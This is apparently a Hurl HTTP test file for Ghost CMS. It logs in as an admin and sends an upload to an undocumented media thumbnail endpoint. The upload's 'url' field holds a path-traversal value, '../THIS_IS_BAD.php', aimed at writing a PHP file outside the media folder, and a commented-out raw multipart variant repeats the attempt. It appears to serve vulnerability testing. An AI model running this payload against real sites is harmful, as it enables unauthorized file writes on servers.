# Login as admin
POST http://{{host}}/ghost/api/admin/session/
{
    "username": "{{admin_email}}",
    "password": "{{admin_password}}"
}
HTTP 201
[Captures]
session_cookie: cookie "ghost-admin-api-session"

# Not documented...
PUT http://{{host}}/ghost/api/admin/media/thumbnail/upload/
[Options]
very-verbose: true
# [Cookies]
# ghost-admin-api-session: {{session_cookie}}
[MultipartFormData]
file: file,images/random.png;
url:http://{{host}}/content/media/../THIS_IS_BAD.php
HTTP 201
[Captures]
image-url: jsonpath "$.images[0].url"

# PUT http://{{host}}/ghost/api/admin/media/thumbnail/upload/
# [Options]
# very-verbose: true
# [MultipartFormData]
# Content-Type: multipart/form-data; boundary="boundary"
# ```
# --boundary
# Content-Disposition: form-data; name="file"; filename="BAD.png"
# Content-Type: image/jpeg

# IMAGE
# --boundary
# Content-Disposition: form-data; name="url"

# http://{{host}}/content/media/BAD.png
# --boundary--
# ```
# HTTP 201
# [Captures]
# image-url: jsonpath "$.images[0].url"



GET {{image-url}}
HTTP 200
[Asserts]
header "Content-Type" contains "image"
